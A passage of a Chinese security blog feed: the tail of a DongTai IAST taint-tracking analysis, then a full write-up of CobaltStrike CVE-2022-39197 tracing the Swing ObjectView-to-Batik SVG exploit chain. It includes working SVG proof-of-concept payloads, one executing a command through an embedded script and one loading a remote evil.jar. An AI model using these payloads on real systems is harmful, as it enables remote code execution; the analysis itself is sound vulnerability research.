还可以由多个条件组合，因此逻辑比较复杂。</p><p><strong>入污点的处理逻辑如下：</strong></p><ul><li><p>如果source 为O，则inValue 为event.object，判断inValue 是否在历史的EngineManager.TAINT_HASH_CODES 中，如果在，则</p><ul><li>将event 加入EngineManager.TRACK_MAP</li><li>调用setTarget，设置出污点</li></ul></li><li><p>如果source 为Px，则inValue 为数组，其中每个值为event.argumentArray[x]，判断event.argumentArray[x] 是否在历史的EngineManager.TAINT_HASH_CODES 中，如果在，则组成新的Array，赋值给inValue，同样</p><ul><li>将event 加入EngineManager.TRACK_MAP</li><li>调用setTarget，设置出污点</li></ul></li><li><p>如果有多条件组合</p><ul><li>将每个条件分拆，存入inValues数组</li><li>每一个条件的inValue值过一遍污点池，不在的则剔除</li><li>这里多条件处理取巧了，如果有and，那么必须每个条件都满足conditionSources.length == condition</li><li>最后同样的将event.setInValue(inValues.toArray)</li><li>将event 加入EngineManager.TRACK_MAP</li><li>调用setTarget，设置出污点</li></ul></li></ul><p><strong>出污点的处理逻辑如下：</strong></p><ul><li><p>如果target 为O</p><ul><li>event.setOutValue(event.object)</li><li>trackTaintRange</li></ul></li><li><p>如果target 为R</p><ul><li>event.setOutValue(event.returnValue);</li><li>trackTaintRange</li></ul></li><li><p>如果target 为P，与inValues类似，outValues 为每一个对应的argumentArray[x]</p><ul><li>event.setOutValue(outValues.toArray());</li><li>针对每一个x，trackTaintRange(propagator, event)</li></ul></li></ul><blockquote><p>疑问：其中trackTaintRange 比较疑惑，还未发现其具体功能？</p></blockquote><p>随着程序的多次调用，程序还会再次进入多次传播节点，这些节点也会被放入 EngineManager.TRACK_MAP 中。</p><blockquote><p>疑问：P-P 逻辑中，都是从event.argumentArray 中获取参数，但是此时是在after中获取的，也就是执行完成，source P 其实已经变成了target P，这里可能存在问题，待验证。</p></blockquote><p><img src="/images/pasted-312.png" alt="upload successful"></p><p>TODO：这里有条规则，待验证。</p><p><img src="/images/pasted-314.png" alt="upload successful"></p><h5 id="4-SinkImpl-solveSink"><a href="#4-SinkImpl-solveSink" class="headerlink" title="4. SinkImpl#solveSink"></a>4. SinkImpl#solveSink</h5><p>应用程序走到最后的 sink 点时，根据 sink 点的配置，判断 sink 点的参数是不是在 TAINT_POOL 中，如果是，则将 sink 点写入 EngineManager.TRACK_MAP 中。</p><p>Sink传播逻辑也很简单，只有source：</p><ul><li>P</li><li>O</li></ul><p>具体逻辑如下：</p><ul><li>如果是P，则获取对应P的值event.argumentArray[x]，判断是否在污点池内，如果在则<ul><li>event.setInValue(sourceValue)</li><li>将event 加入EngineManager.TRACK_MAP</li></ul></li><li>如果是O，则判断event.object 是否在污点池内，如果在则同样<ul><li>event.setInValue(event.object)</li><li>将event 加入EngineManager.TRACK_MAP</li></ul></li></ul><p><img src="/images/pasted-307.png" alt="upload successful"></p><h5 id="5-SpyDispatcherImpl-leaveHttp"><a href="#5-SpyDispatcherImpl-leaveHttp" class="headerlink" title="5. SpyDispatcherImpl#leaveHttp"></a>5. SpyDispatcherImpl#leaveHttp</h5><p>在应用程序执行完，回到http 节点，最后执行到 leaveHttp 时，会调用 GraphBuilder 构造污点调用图并发送至云端。</p><h3 id="3-3-其他漏洞检测"><a href="#3-3-其他漏洞检测" class="headerlink" title="3.3 其他漏洞检测"></a>3.3 其他漏洞检测</h3><ul><li>越权检测</li><li>CRYPTO_WEEK_RANDOMNESS</li><li>CRYPTO_BAD_MAC</li><li>CRYPTO_BAC_CIPHERS</li><li>COOKIE_FLAGS_MISSING</li></ul><h2 id="0x4-测试"><a href="#0x4-测试" class="headerlink" title="0x4 测试"></a>0x4 测试</h2><p>暂时不关注，待后续有需求再补充</p><h2 id="0x5-问题"><a href="#0x5-问题" class="headerlink" title="0x5 问题"></a>0x5 问题</h2><p><strong>Java 协程</strong></p><blockquote><p>2022年9月20日， Java 19 提供了虚拟线程</p></blockquote><p>前文提到EngineManager 上下文环境是基于线程，在协程模式下可能会存在上下文混淆，针对携程要怎么处理呢？</p><p><strong>异步</strong></p><p>req-&gt;res 过程如果不是同一个线程，同样会存在上下文问题。</p><p><strong>Go Agent</strong></p><p>Go Agent的Source/Propagate 规则都写死在Agent上，并不能在Server 端动态的配置。</p><p><strong>Server Taint Rule Engine</strong></p><p>Server端还有一套污点规则引擎。</p><h2 id="0x6-总结"><a href="#0x6-总结" class="headerlink" title="0x6 总结"></a>0x6 总结</h2><p>被动IAST 的核心逻辑是整个污点链的跟踪，维护了一个污点hash表，从污点source，再通过默认收集的propagate 规则，收集其传播之后的污点值，都收集到污点hash表中，最终在sink中判断是否是污点成功传播至此。</p><p>分析过程中发现的一些问题：</p><ol><li>filter 规则貌似当作了普通的propagate 规则，并没有做其他处理，这个难道不会造成误报吗？<br> <img src="/images/pasted-306.png" alt="upload successful"></li><li>propagate P-P传播的时候，都是取得event.argumentArray，这里可能存在问题，待测试。</li><li>比较依赖配置的propagate 规则，这里包含了所有的可能导致污点变化的传播，如果不全可能导致漏报。</li><li>Array/Map 之类在传播过程中，会导致误报，因为规则仅支持P级粒度的映射。</li></ol><p>在分析DongTai IAST之后，发现自己之前对被动IAST 完全误解了。</p><h2 id="0x7-参考"><a href="#0x7-参考" class="headerlink" title="0x7 参考"></a>0x7 参考</h2><ul><li>[1] <a href="https://su18.org/post/dongtai/#sinksourcepropagatorhttp">洞态 IAST 试用</a></li><li>[2] <a href="https://anemone.top/iast-%E6%82%AC%E9%95%9C%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E7%81%B0%E7%9B%92%E6%B5%8B%E8%AF%95/">悬镜技术分享笔记——灰盒测试</a></li><li>[3] <a href="https://github.com/HXSecurity/DongTai">HXSecurity/DongTai</a></li><li>[4] <a href="https://github.com/HXSecurity/DongTai-agent-java">HXSecurity/DongTai-agent-java</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x1-背景知识&quot;&gt;&lt;a href=&quot;#0x1-背景知识&quot; class=&quot;headerlink&quot; title=&quot;0x1 背景知识&quot;&gt;&lt;/a&gt;0x1 背景知识&lt;/h2&gt;&lt;p&gt;IAST 概念虽然很早就提出了，但是在实际使用情况中，因为其生产无侵入性与漏误报情况，实际使用效果还是不错的。&lt;/p&gt;
&lt;h3 id=&quot;1-1-IAST&quot;&gt;&lt;a href=&quot;#1-1-IAST&quot; class=&quot;headerlink&quot; title=&quot;1.1 IAST&quot;&gt;&lt;/a&gt;1.1 IAST&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;DAST (Dynamic Application Security Testing)&lt;/li&gt;
&lt;li&gt;IAST (Interactive Application Security Testing)&lt;/li&gt;
&lt;li&gt;RASP（Runtime Application Self-protection）&lt;/li&gt;
&lt;li&gt;SAST (Static Application Security Testing)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;属IAST 最模糊，与三者都有纠缠。&lt;/p&gt;
&lt;h3 id=&quot;1-2-主动-与-被动&quot;&gt;&lt;a href=&quot;#1-2-主动-与-被动&quot; class=&quot;headerlink&quot; title=&quot;1.2 主动 与 被动&quot;&gt;&lt;/a&gt;1.2 主动 与 被动&lt;/h3&gt;&lt;h4 id=&quot;1-2-1-主动IAST&quot;&gt;&lt;a href=&quot;#1-2-1-主动IAST&quot; class=&quot;headerlink&quot; title=&quot;1.2.1 主动IAST&quot;&gt;&lt;/a&gt;1.2.1 主动IAST&lt;/h4&gt;&lt;p&gt;主动IAST很简单，可以简单理解为 动态IAST = DAST + RASP&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/pasted-294.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="程序分析" scheme="http://m0d9.me/categories/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="IAST" scheme="http://m0d9.me/tags/IAST/"/>
    
    <category term="DongTai" scheme="http://m0d9.me/tags/DongTai/"/>
    
  </entry>
  
  <entry>
    <title>CobaltStrike CVE-2022-39197 漏洞分析</title>
    <link href="http://m0d9.me/2022/09/27/CS/"/>
    <id>http://m0d9.me/2022/09/27/CS/</id>
    <published>2022-09-27T08:36:00.000Z</published>
    <updated>2022-10-27T02:18:14.121Z</updated>
    
    <content type="html"><![CDATA[<p>CobaltStrike 作为流行的cs控制工具，当CVE-2022-39197 公布后，居然可以RCE ，这对红蓝双方带来的影响自然不言而喻。</p><h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>这个漏洞可能是继Spring4Shell 之后的又一Java 🔥漏洞。漏洞是由beichen 师傅发现的，然后java小王子浅蓝师傅没过多久就卷出来了，接着pandan师傅、漂亮鼠师傅陆续都复现了，直到整个java安全圈都有在分析这个漏洞。</p><p>这个漏洞是很值得分析的：</p><ul><li>CobaltStrike RCE，这个不用多说，攻防互换，每一种反制手段都极其罕见</li><li>是Java Swing GUI 的漏洞，GUI 的RCE 凤毛麟角，很是珍贵</li><li>是通用漏洞，比如 CobaltStrike 用到的Apache bakit</li><li>据说beichen有jdk的链，期待</li></ul><blockquote><p>赛博群名言：只要知道有洞，就会被群友卷出来。</p></blockquote><p>知道有漏洞，再去定向分析，已经是开卷考试了。但是分析过程仍然坎坷、复杂，因此对beichen 师傅认真膜一个，能从一个set点坚持找到对应的利用链，真的是很需要耐心和细心。</p><a id="more"></a><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>本文这里只做漏洞原理分析，并不像以往进行思路分析，只是从source、sink、gadget 去复现该漏洞，暂不解释各自的发现思路。</p><h3 id="2-1-Source-ObjectView"><a href="#2-1-Source-ObjectView" class="headerlink" title="2.1 Source: ObjectView"></a>2.1 Source: ObjectView</h3><p>这里参考【1】中漂亮鼠师傅详细讲解了ObjectView，这里不赘述</p><p>javax.swing.text.html.ObjectView</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Component <span class="title">createComponent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    AttributeSet attr = getElement().getAttributes();</span><br><span class="line">    String classname = (String) attr.getAttribute(HTML.Attribute.CLASSID);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ReflectUtil.checkPackageAccess(classname);</span><br><span class="line">        Class c = Class.forName(classname, <span class="keyword">true</span>,Thread.currentThread().</span><br><span class="line">                                getContextClassLoader());</span><br><span class="line">        Object o = c.newInstance();</span><br><span class="line">        <span class="keyword">if</span> (o <span class="keyword">instanceof</span> Component) &#123;</span><br><span class="line">            Component comp = (Component) o;</span><br><span class="line">            setParameters(comp, attr);</span><br><span class="line">            <span class="keyword">return</span> comp;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接引用结论：</p><ol><li>classid传入需要实例化的类，类必须继承与Component</li><li>必须有无参构造方法，貌似是因为newinstant是调用的无参构造方法</li><li>必须存在一个setXXX方法的XXX属性</li><li>setXXX方法的传参数必须是接受一个string类型的参数</li></ol><h3 id="2-2-查找Component"><a href="#2-2-查找Component" class="headerlink" title="2.2 查找Component"></a>2.2 查找Component</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">match PATH=(m:Method)-[r2:HAS]-(source:Class)-[r:EXTENDS*]-(sink:Class &#123;NAME:&quot;java.awt.Component&quot;&#125;)</span><br><span class="line">where m.NAME =~ &quot;set.*&quot; and m.PARAMETER_SIZE=1 and m.SIGNATURE =~ &quot;.*String.*&quot;</span><br><span class="line">return m.CLASSNAME,m.NAME,m.SIGNATURE</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-292.png" alt="upload successful"></p><p>没啥技巧，只能一个个尝试，了解原理一个个排除。</p><p>这里先暂时直接给结论，org.apache.batik.swing.JSVGCanvas#setURI可以。</p><p>有师傅们也给了codeql的搜索条件：<br><img src="/images/pasted-285.png" alt="upload successful"></p><h3 id="2-3-Sink"><a href="#2-3-Sink" class="headerlink" title="2.3 Sink"></a>2.3 Sink</h3><p>粗略跟跟setURI</p><p>JSVGCanvas#setURI</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// public class JSVGCanvas extends JSVGComponent</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setURI</span><span class="params">(String paramString)</span> </span>&#123;</span><br><span class="line">    String str = <span class="keyword">this</span>.uri;</span><br><span class="line">    <span class="keyword">this</span>.uri = paramString;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.uri != <span class="keyword">null</span>) &#123;</span><br><span class="line">      loadSVGDocument(<span class="keyword">this</span>.uri);</span><br></pre></td></tr></table></figure><p>AbstractJSVGComponent#loadSVGDocument</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//public class AbstractJSVGComponent extends JGVTComponent </span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadSVGDocument</span><span class="params">(String paramString)</span> </span>&#123;</span><br><span class="line">  String str = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.svgDocument != <span class="keyword">null</span>)</span><br><span class="line">    str = <span class="keyword">this</span>.svgDocument.getURL(); </span><br><span class="line">  ParsedURL parsedURL = <span class="keyword">new</span> ParsedURL(str, paramString);</span><br><span class="line">  stopThenRun(<span class="keyword">new</span> Runnable(<span class="keyword">this</span>, parsedURL) &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> ParsedURL val$newURI;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractJSVGComponent <span class="keyword">this</span>$<span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          String str = <span class="keyword">this</span>.val$newURI.toString();</span><br><span class="line">          <span class="keyword">this</span>.<span class="keyword">this</span>$<span class="number">0.f</span>ragmentIdentifier = <span class="keyword">this</span>.val$newURI.getRef();</span><br><span class="line">          <span class="keyword">this</span>.<span class="keyword">this</span>$<span class="number">0.l</span>oader = <span class="keyword">new</span> DocumentLoader(<span class="keyword">this</span>.<span class="keyword">this</span>$<span class="number">0.</span>userAgent);</span><br><span class="line">          <span class="keyword">this</span>.<span class="keyword">this</span>$<span class="number">0.</span>nextDocumentLoader = <span class="keyword">new</span> SVGDocumentLoader(str, <span class="keyword">this</span>.<span class="keyword">this</span>$<span class="number">0.l</span>oader);</span><br><span class="line">          <span class="keyword">this</span>.<span class="keyword">this</span>$<span class="number">0.</span>nextDocumentLoader.setPriority(<span class="number">1</span>);</span><br><span class="line">          Iterator iterator = <span class="keyword">this</span>.<span class="keyword">this</span>$<span class="number">0.</span>svgDocumentLoaderListeners.iterator();</span><br><span class="line">          <span class="keyword">while</span> (iterator.hasNext())</span><br><span class="line">            <span class="keyword">this</span>.<span class="keyword">this</span>$<span class="number">0.</span>nextDocumentLoader.addSVGDocumentLoaderListener(iterator.next()); </span><br><span class="line">          <span class="keyword">this</span>.<span class="keyword">this</span>$<span class="number">0.</span>startDocumentLoader();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SVGDocumentLoader#run</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//public class SVGDocumentLoader extends HaltingThread</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  SVGDocumentLoaderEvent sVGDocumentLoaderEvent = <span class="keyword">new</span> SVGDocumentLoaderEvent(<span class="keyword">this</span>, <span class="keyword">null</span>);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    fireEvent(startedDispatcher, sVGDocumentLoaderEvent);</span><br><span class="line">    <span class="keyword">if</span> (isHalted()) &#123;</span><br><span class="line">      fireEvent(cancelledDispatcher, sVGDocumentLoaderEvent);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    SVGDocument sVGDocument = (SVGDocument)<span class="keyword">this</span>.loader.loadDocument(<span class="keyword">this</span>.url);</span><br></pre></td></tr></table></figure><p>DocumentLoader#loadDocument</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//public class DocumentLoader &#123;</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Document <span class="title">loadDocument</span><span class="params">(String paramString)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    Document document = checkCache(paramString);</span><br><span class="line">    <span class="keyword">if</span> (document != <span class="keyword">null</span>)</span><br><span class="line">      <span class="keyword">return</span> document; </span><br><span class="line">    SVGDocument sVGDocument = <span class="keyword">this</span>.documentFactory.createSVGDocument(paramString);</span><br><span class="line">    DocumentDescriptor documentDescriptor = <span class="keyword">this</span>.documentFactory.getDocumentDescriptor();</span><br><span class="line">    DocumentState documentState = <span class="keyword">new</span> DocumentState(<span class="keyword">this</span>, paramString, (Document)sVGDocument, documentDescriptor);</span><br></pre></td></tr></table></figure><p>然后找到不多的几个实现类，SAXSVGDocumentFactory#createSVGDocument，大致功能为load svg file。</p><h3 id="2-4-SVG-Script"><a href="#2-4-SVG-Script" class="headerlink" title="2.4 SVG Script"></a>2.4 SVG Script</h3><p>那么接下来就看看svg有哪些标签可用，参考【2】中可以发现，svg支持script，bakit的具体实现上支持rhino和jar，那么构造对应的poc即可。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/ecmascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">        java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;open -a calculator&#x27;</span>);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意：</p><ol><li>该poc不能直接打cs，因为cs中默认不含rhino</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;application/java-archive&quot;</span> <span class="attr">xlink:href</span>=<span class="string">&quot;http://127.0.0.1:8080/evil.jar&quot;</span>/&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;<span class="name">text</span>&gt;</span>Static text ...<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p>注意：</p><ol><li>Manifest 中需要指定SVG-Handler-Class: com.m0d9.sec.SVGHandler</li><li>xlink:href</li><li>implements EventListenerInitializer 实现handleEvent。</li></ol><p><img src="/images/pasted-293.png" alt="upload successful"></p><p>调用栈：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">exec:347, Runtime (java.lang)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invoke:138, MemberBox (org.mozilla.javascript)</span><br><span class="line">call:226, NativeJavaMethod (org.mozilla.javascript)</span><br><span class="line">call1:45, OptRuntime (org.mozilla.javascript.optimizer)</span><br><span class="line">_c_script_0:4, Inline__script__http___127_0_0_1_8080_poc_rhino_svg_2_2 (org.mozilla.javascript.gen)</span><br><span class="line">call:-1, Inline__script__http___127_0_0_1_8080_poc_rhino_svg_2_2 (org.mozilla.javascript.gen)</span><br><span class="line">doTopCall:412, ContextFactory (org.mozilla.javascript)</span><br><span class="line">doTopCall:3545, ScriptRuntime (org.mozilla.javascript)</span><br><span class="line">call:-1, Inline__script__http___127_0_0_1_8080_poc_rhino_svg_2_2 (org.mozilla.javascript.gen)</span><br><span class="line">exec:-1, Inline__script__http___127_0_0_1_8080_poc_rhino_svg_2_2 (org.mozilla.javascript.gen)</span><br><span class="line">evaluateReader:1303, Context (org.mozilla.javascript)</span><br><span class="line">run:-1, RhinoInterpreter$2 (org.apache.batik.script.rhino)</span><br><span class="line">call:559, Context (org.mozilla.javascript)</span><br><span class="line">call:522, ContextFactory (org.mozilla.javascript)</span><br><span class="line">evaluate:-1, RhinoInterpreter (org.apache.batik.script.rhino)</span><br><span class="line">loadScripts:-1, BaseScriptingEnvironment (org.apache.batik.bridge)</span><br><span class="line">dispatchSVGLoadEvent:-1, UpdateManager (org.apache.batik.bridge)</span><br><span class="line">dispatchSVGLoadEvent:-1, UpdateManager (org.apache.batik.bridge)</span><br><span class="line">run:-1, SVGLoadEventDispatcher (org.apache.batik.swing.svg)</span><br></pre></td></tr></table></figure><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>这个漏洞是高难度的，能发现真的很厉害，漏洞本身危害也不小，算得上是Swing 的一个攻击面了。pyn3rd师傅提供的参考【4】中，其实很早就有关swing xss的风险，这个漏洞提供了新的RCE 攻击方式。</p><p>Component 的查找可以做到自动化，codeql/tabby 都能做，但是这一步只能算整个漏洞的1/2，剩下的sink点以及后半段gadget，因为涉及到GUI及异步框架，从调用链中也可以看到，目前无法自动化。</p><p>Java 安全真心卷。</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><ul><li>[1] <a href="https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ">最新CS RCE曲折的复现路 (by:漂亮鼠🐭)</a></li><li>[2] <a href="https://xmlgraphics.apache.org/batik/using/scripting/java.html">The Apache™ Batik Project: Scripting With Java</a></li><li>[3] <a href="https://github.com/burpheart/cve-2022-39197">burpheart/cve-2022-39197 (by:橙子酱)</a></li><li>[4] <a href="https://hackerone.com/reports/1054382">HTML Injection in Swing can disclose netNTLM hash or cause DoS</a></li><li>[5] <a href="https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html">SVG files and Java code execution</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;CobaltStrike 作为流行的cs控制工具，当CVE-2022-39197 公布后，居然可以RCE ，这对红蓝双方带来的影响自然不言而喻。&lt;/p&gt;
&lt;h2 id=&quot;0x01-背景&quot;&gt;&lt;a href=&quot;#0x01-背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景&quot;&gt;&lt;/a&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;这个漏洞可能是继Spring4Shell 之后的又一Java 🔥漏洞。漏洞是由beichen 师傅发现的，然后java小王子浅蓝师傅没过多久就卷出来了，接着pandan师傅、漂亮鼠师傅陆续都复现了，直到整个java安全圈都有在分析这个漏洞。&lt;/p&gt;
&lt;p&gt;这个漏洞是很值得分析的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CobaltStrike RCE，这个不用多说，攻防互换，每一种反制手段都极其罕见&lt;/li&gt;
&lt;li&gt;是Java Swing GUI 的漏洞，GUI 的RCE 凤毛麟角，很是珍贵&lt;/li&gt;
&lt;li&gt;是通用漏洞，比如 CobaltStrike 用到的Apache bakit&lt;/li&gt;
&lt;li&gt;据说beichen有jdk的链，期待&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;赛博群名言：只要知道有洞，就会被群友卷出来。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;知道有漏洞，再去定向分析，已经是开卷考试了。但是分析过程仍然坎坷、复杂，因此对beichen 师傅认真膜一个，能从一个set点坚持找到对应的利用链，真的是很需要耐心和细心。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="CobaltStrike" scheme="http://m0d9.me/tags/CobaltStrike/"/>
    
  </entry>
  
</feed>
